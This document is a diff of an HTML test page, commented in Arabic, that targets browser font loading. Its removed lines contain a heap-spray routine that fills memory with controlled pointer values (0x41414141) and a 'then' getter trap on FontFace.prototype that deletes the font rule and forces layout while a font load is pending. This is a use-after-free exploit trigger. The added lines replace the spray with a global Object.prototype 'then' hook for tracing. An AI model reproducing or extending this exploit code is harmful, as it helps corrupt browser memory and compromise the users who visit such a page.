@@ -2,68 +2,51 @@
 <html>
 <head>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; }
-        #console { width: 100%; height: 90vh; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; }
+        #console { width: 100%; height: 90vh; overflow-y: scroll; border: 1px solid #333; }
     </style>
 </head>
 <body>
     <div id="console"></div>
-
     <style id="s">@font-face { font-family: 'x'; src: local('Arial'); }</style>
 
     <script>
         const logBox = document.getElementById('console');
+        
+        // كونسول مباشر يعرض أي شيء يمر عبره
         function debug(msg) {
-            logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logBox.innerHTML += `<div>[${performance.now().toFixed(2)}ms] ${msg}</div>`;
             logBox.scrollTop = logBox.scrollHeight;
         }
 
-        // --- مكان وضع الكود الجديد للرش (Heap Spraying) ---
-        function sprayHeap() {
-            debug("Spraying heap with controlled pointers (0x41414141)...");
-            let spray = [];
-            for (let i = 0; i < 500; i++) {
-                let arr = new Uint32Array(0x400);
-                // هذا هو النمط الذي سيعوض الكائن المحرر
-                arr[0] = 0x41414141; // العنوان الأول
-                arr[1] = 0x42424242; // العنوان الثاني
-                spray.push(arr);
+        // مراقبة شاملة: اعتراض أي وصول للـ then في أي كائن
+        Object.defineProperty(Object.prototype, 'then', {
+            configurable: true,
+            get() {
+                debug("INTERCEPTED: Access to 'then' detected!");
+                return undefined;
             }
-            return spray;
-        }
-        // --------------------------------------------------
+        });
 
-        
-        
-      window.onload = async () => {
-    debug("System Initialized.");
-    
-    // 1. تعريف الكائن أولاً
-    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-
-    // 2. الرش الآن (بعد التعريف مباشرة وقبل التحميل)
-    let memoryBuffers = sprayHeap(); 
-
-    // 3. وضع الفخ
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            debug("!!! TRAP HIT !!!");
-            document.getElementById('s').sheet.deleteRule(0);
-            document.body.offsetTop;
-            return undefined;
-        }
-    });
-
-      
-
-            debug("Attempting load...");
+        window.onload = async () => {
+            debug("System Initialized. Universal Hook active.");
+            
             try {
-                await document.fonts.load('1em x', 'AB');
-                debug("Load returned.");
+                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                debug("FontFace created.");
+                
+                document.fonts.add(A);
+                debug("FontFace added to document.fonts.");
+
+                debug("Starting Font load...");
+                // استدعاء التحميل
+                let p = document.fonts.load('1em x', 'AB');
+                debug("Load() function called.");
+                
+                await p;
+                debug("Load promise resolved.");
             } catch (e) {
-                debug("Analysis: " + e.message);
+                debug("CRITICAL ERROR: " + e.message);
             }
         };
     </script>
